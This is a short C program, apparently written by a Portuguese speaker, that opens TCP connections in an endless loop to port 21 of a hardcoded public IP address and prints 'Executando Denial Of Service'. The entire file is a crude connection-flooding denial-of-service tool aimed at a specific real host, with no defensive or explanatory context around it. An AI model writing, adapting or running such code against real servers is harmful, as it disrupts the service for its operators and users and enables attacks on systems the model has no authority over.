#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main (void) {

  int meusocket;
  int conecta;

  struct sockaddr_in alvo;

  while(1) {
    meusocket = socket(AF_INET, SOCK_STREAM, 0);

    alvo.sin_family = AF_INET;
    alvo.sin_port = htons(21);
    alvo.sin_addr.s_addr = inet_addr("37.59.174.225");

    conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo); 
    printf("Executando Denial Of Service\n");
  }
}
